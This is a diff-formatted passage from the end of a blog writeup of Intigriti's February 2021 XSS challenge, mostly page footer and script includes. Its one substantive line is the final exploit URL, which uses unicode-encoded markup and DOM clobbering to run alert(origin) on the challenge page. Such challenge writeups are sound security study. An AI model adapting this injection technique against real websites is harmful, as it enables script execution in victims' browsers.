+<p>The final URL - <a href="https://challenge-0221.intigriti.io/?assignmentTitle=%e2%88%80%e3%b8%80%e3%b3%9ata%20id=result%e3%b8%80%e3%b3%9ata%20id=result%20name=questionAnswer%20value=alert%28origin%29//&amp;autosubmit" target="_blank" rel="noopener noreffer">https://challenge-0221.intigriti.io/?assignmentTitle=∀㸀㳚ta%20id=result㸀㳚ta%20id=result%20name=questionAnswer%20value=alert(origin)//&amp;autosubmit</a></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 20-02-2021</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/2021/02/intigriti-february-xss-challenge/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://blog.xss.am/2021/02/intigriti-february-xss-challenge/" data-title="Intigriti&#39;s February XSS Challenge Writeup" data-hashtags="challenge,xss,intigriti,unicode,eval,DOM clobbering"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.xss.am/2021/02/intigriti-february-xss-challenge/" data-hashtag="challenge"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://blog.xss.am/2021/02/intigriti-february-xss-challenge/" data-title="Intigriti&#39;s February XSS Challenge Writeup"><i class="fab fa-hacker-news fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://blog.xss.am/2021/02/intigriti-february-xss-challenge/"><i class="fab fa-reddit fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/challenge/">challenge</a>,&nbsp;<a href="/tags/xss/">xss</a>,&nbsp;<a href="/tags/intigriti/">intigriti</a>,&nbsp;<a href="/tags/unicode/">unicode</a>,&nbsp;<a href="/tags/eval/">eval</a>,&nbsp;<a href="/tags/dom-clobbering/">DOM clobbering</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2020/12/armsec-2020/" class="prev" rel="prev" title="Web is hard, reARMSEC aka ARMSec 2020"><i class="fas fa-angle-left fa-fw"></i>Web is hard, reARMSEC aka ARMSec 2020</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://xss.am" target="_blank">davwwwx</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.8/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/twemoji@13.0.0/dist/twemoji.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.4.0/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@7.0.4/dist/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":70},"comment":{},"data":{"id-1":"/blog.xss.am/","id-2":"/blog.xss.am/"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"},"twemoji":true,"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.f0e4096f68a24e87589ba7942f64874a24befc1ce05399522b0178ac9d3fb20b351b96e095dd6b5bfbe89cb6834a4b3a.js" integrity="sha384-8OQJb2iiTodYm6eUL2SHSiS&#43;/BzgU5lSKwF4rJ0/sgs1G5bgld1rW/vonLaDSks6"></script></body>
+</html>
